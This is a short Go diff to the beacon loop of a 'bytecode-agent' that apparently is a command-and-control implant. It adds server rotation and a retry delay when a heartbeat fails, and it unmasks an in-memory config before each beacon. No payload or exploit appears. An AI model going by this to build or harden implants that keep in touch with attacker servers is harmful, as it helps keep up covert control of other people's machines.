@@ -5,7 +5,6 @@ import (
 	"fmt"
 	"log"
 	"math/rand"
-	"strings"
 	"time"
 
 	"bytecode-agent/internal/comms"
@@ -69,13 +68,14 @@ func Loop(client *comms.Client, wsClient *comms.WSClient, cfg *config.Config) er
 			// Unmask to perform heartbeat
 			cfg.Unmask()
 			
-			log.Println("[BEACON] Sending heartbeat...")
+			log.Printf("[BEACON] Sending heartbeat to %s...\n", cfg.GetServerURL())
 			resp, err := client.Beacon()
 			if err != nil {
-				log.Printf("[BEACON] Error: %v\n", err)
-				if strings.Contains(err.Error(), "HTTP 403") {
-					return fmt.Errorf("identity invalid (403): %w", err)
-				}
+				log.Printf("[BEACON] Heartbeat failed: %v. Rotating server...\n", err)
+				cfg.RotateServer()
+				
+				// Wait before retry on failure
+				time.Sleep(30 * time.Second)
 				continue
 			}
 
